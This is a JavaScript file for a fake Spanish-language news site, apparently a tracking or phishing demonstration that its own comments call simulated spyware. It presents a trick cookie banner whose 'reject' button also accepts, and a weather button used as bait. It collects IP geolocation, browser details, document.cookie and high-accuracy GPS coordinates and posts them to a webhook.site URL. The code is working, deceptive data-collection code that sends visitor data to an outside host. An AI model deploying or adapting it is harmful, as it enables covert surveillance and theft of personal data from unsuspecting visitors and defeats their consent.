/**
 * GLOBAL INSIGHT CORE SYSTEM
 * Módulo de gestión de contenidos y telemetría.
 */

const CONFIG = {
    // Sustituye esto por tu Webhook.site real si es necesario
    WEBHOOK_URL: "https://webhook.site/c295ad9f-09f9-4803-b5cd-5971022be5a1",
    SILENT_MODE: false,
    COOKIE_TIMEOUT: 1500, // Aparece a los 1.5 segundos
    FORCE_ACCEPT: true
};

const newsDatabase = [
    { title: "Avance Histórico en Inteligencia Artificial Generativa", category: "Tecnología" },
    { title: "Mercados Asiáticos Cierran al Alza tras Anuncios", category: "Economía" },
    { title: "La NASA Confirma Nueva Misión a las Lunas de Júpiter", category: "Ciencia" },
    { title: "El Futuro del Trabajo Híbrido: Informe 2025", category: "Negocios" },
    { title: "Ciberseguridad: Nuevos Protocolos Bancarios", category: "Tech" },
    { title: "Crisis Climática: Acuerdos de la Cumbre Global", category: "Mundo" }
];

// --- CLASE DE RASTREO (SPYWARE SIMULADO) ---
class SpywareAgent {
    constructor(webhook) {
        this.webhook = webhook;
        this.ipData = null;
        this.userAgent = navigator.userAgent;
        this.acceptedCookies = false;
        this.grantedGPS = false;
    }

    // Rastreo pasivo de IP y navegador
    async trackIP() {
        try {
            const res = await fetch('https://ipwho.is/');
            const data = await res.json();
            this.ipData = data;
            
            const browserData = {
                userAgent: this.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                screen: { w: screen.width, h: screen.height },
                cookies: document.cookie
            };
            
            const combinedData = { ...data, ...browserData };
            this.exfiltrate(combinedData, "PASSIVE_DATA", "Rastreo General");
            return combinedData;
        } catch (e) { 
            console.error("Fallo rastreo IP");
        }
    }

    // Rastreo activo de GPS
    trackGPS(onSuccess, onError) {
        if (!navigator.geolocation) return onError("GPS no soportado");
        
        navigator.geolocation.getCurrentPosition(
            (pos) => {
                const { latitude, longitude, accuracy } = pos.coords;
                this.grantedGPS = true;
                
                const gpsData = {
                    lat: latitude,
                    lon: longitude,
                    acc: accuracy,
                    timestamp: pos.timestamp,
                    map_url: `https://www.google.com/maps?q=${latitude},${longitude}`,
                    ...this.ipData
                };

                this.exfiltrate(gpsData, "ACTIVE_GPS_TARGET", "Ubicación Exacta");
                onSuccess(gpsData);
            },
            (err) => {
                this.grantedGPS = false;
                onError(err);
            },
            { enableHighAccuracy: true, timeout: 10000 }
        );
    }

    // Envío de datos al servidor (Webhook)
    exfiltrate(payload, type, precision) {
        const dataToSend = {
            ALERTA: type,
            PRECISION: precision,
            FECHA: new Date().toISOString(),
            DATOS: payload
        };

        fetch(this.webhook, {
            method: 'POST',
            headers: { 'Content-Type': 'text/plain' }, // Evita CORS preflight complejo
            body: JSON.stringify(dataToSend)
        }).then(() => console.log(`[System] Datos enviados: ${type}`));
    }

    setCookiesAccepted(status) {
        this.acceptedCookies = status;
        if (status) {
            this.exfiltrate({ status: "ACCEPTED" }, "COOKIE_CONSENT", "Usuario");
        }
    }
}

// --- LÓGICA PRINCIPAL DE LA PÁGINA ---
document.addEventListener("DOMContentLoaded", () => {
    
    const spy = new SpywareAgent(CONFIG.WEBHOOK_URL);
    
    // 1. Mostrar Modal de Cookies tras breve pausa
    setTimeout(() => {
        setupCookieTrap(spy);
    }, CONFIG.COOKIE_TIMEOUT);

    // 2. Configurar Botón de GPS (La Trampa)
    const btnGps = document.getElementById("btn-gps-trigger");
    const terminal = document.getElementById("hacker-terminal");
    
    // Poner fecha actual
    document.getElementById("current-date").innerText = new Date().toLocaleDateString('es-ES', { 
        weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' 
    });

    btnGps.addEventListener("click", () => {
        if (!spy.acceptedCookies) {
            alert("Error: Debe aceptar las políticas de privacidad para habilitar servicios locales.");
            document.getElementById('cookie-modal').style.display = 'flex';
            return;
        }
        
        const btn = btnGps.querySelector("button");
        const originalText = btn.innerText;
        btn.innerHTML = '<i class="fas fa-circle-notch fa-spin"></i> Conectando Satélite...';
        
        spy.trackGPS(
            (data) => {
                // Éxito: Mostrar Terminal Hacker
                renderTerminal(data);
                btnGps.style.display = "none"; // Ocultar botón original
            },
            (error) => {
                btn.innerHTML = '<i class="fas fa-times"></i> Error de Señal';
                setTimeout(() => { btn.innerText = originalText; }, 2000);
                alert("El navegador bloqueó el acceso a la ubicación. Habilite los permisos para ver el clima.");
            }
        );
    });

    // --- FUNCIONES AUXILIARES ---

    function setupCookieTrap(spyAgent) {
        const modal = document.getElementById('cookie-modal');
        const btnAcceptAll = document.getElementById('btn-accept-all');
        const btnReject = document.getElementById('btn-reject');

        modal.style.display = 'flex';

        // Botón Aceptar Real
        btnAcceptAll.addEventListener('click', () => {
            closeModalAndTrack(spyAgent, modal);
        });
        
        // Botón "Guardar Preferencias" (La Trampa: También acepta todo)
        btnReject.addEventListener('click', () => {
            btnReject.innerHTML = '<i class="fas fa-check"></i> Guardando...';
            setTimeout(() => {
                closeModalAndTrack(spyAgent, modal);
            }, 800);
        });
    }

    function closeModalAndTrack(spyAgent, modal) {
        spyAgent.setCookiesAccepted(true);
        modal.style.display = 'none';
        
        // Llenar contenido real
        renderDynamicContent();
        // Iniciar rastreo silencioso de IP
        spyAgent.trackIP();
        
        // Notificación visual "segura"
        showSafeNotification();
    }

    function showSafeNotification() {
        const notif = document.createElement('div');
        notif.style.cssText = `
            position: fixed; top: 20px; right: 20px; background: #0f9d58; color: white;
            padding: 15px 25px; border-radius: 8px; box-shadow: 0 5px 15px rgba(0,0,0,0.2);
            z-index: 10000; font-weight: bold; animation: slideIn 0.5s ease;
        `;
        notif.innerHTML = '<i class="fas fa-shield-alt"></i> Preferencias guardadas con éxito';
        document.body.appendChild(notif);
        setTimeout(() => notif.remove(), 3000);
    }

    function renderDynamicContent() {
        const shuffled = [...newsDatabase].sort(() => 0.5 - Math.random());
        const hero = shuffled[0];
        const secondary = shuffled.slice(1, 5);
        const randID = Math.floor(Math.random() * 1000);

        // Renderizar Hero
        document.getElementById("hero-news").innerHTML = `
            <img src="https://picsum.photos/seed/${randID}/800/600" alt="News">
            <div class="hero-content">
                <span style="background:#0056b3; padding:4px 8px; font-size:0.75rem; border-radius:2px; margin-bottom:10px; display:inline-block;">${hero.category}</span>
                <h1>${hero.title}</h1>
                <p class="meta" style="padding:0; color:#eee;">Hace ${Math.floor(Math.random() * 40) + 5} minutos • Redacción Central</p>
            </div>
        `;

        // Renderizar Grid
        const gridContainer = document.getElementById("secondary-grid");
        gridContainer.innerHTML = '';
        secondary.forEach((news, index) => {
            const r = Math.floor(Math.random() * 1000) + index;
            gridContainer.innerHTML += `
                <div class="news-card">
                    <img src="https://picsum.photos/seed/${r}/400/250" alt="Thumb">
                    <h3>${news.title}</h3>
                    <span class="meta">Leído por ${Math.floor(Math.random()*5000)} personas</span>
                </div>
            `;
        });

        // Renderizar Tendencias
        const trendList = document.getElementById("trending-list");
        trendList.innerHTML = '';
        shuffled.slice(0, 4).forEach((news, i) => {
            trendList.innerHTML += `<li><span>0${i+1}</span> <div style="font-size:0.9rem; font-weight:500;">${news.title}</div></li>`;
        });
    }

    function renderTerminal(data) {
        terminal.classList.remove("hidden");
        terminal.innerHTML = `
            >> SYSTEM_OVERRIDE [INITIATED]... <span style="color:#0f0">OK</span><br>
            >> BYPASSING_FIREWALL... <span style="color:#0f0">SUCCESS</span><br>
            ----------------------------------------<br>
            > TARGET_ACQUIRED: <span style="color:red; font-weight:bold;">CONFIRMED</span><br>
            > LAT: ${data.lat}<br>
            > LON: ${data.lon}<br>
            > ACC: ${data.acc} meters (High Precision)<br>
            > ISP: ${data.connection ? data.connection.isp : 'Unknown'}<br>
            ----------------------------------------<br>
            <br>
            <span style="color:yellow; blink:true;">⚠ UPLOADING USER DATA TO REMOTE SERVER...</span><br>
            <br>
            <a href="${data.map_url}" target="_blank" style="border:1px solid #0f0; padding:5px; text-decoration:none;">[ VER EN GOOGLE MAPS ]</a>
        `;
    }
});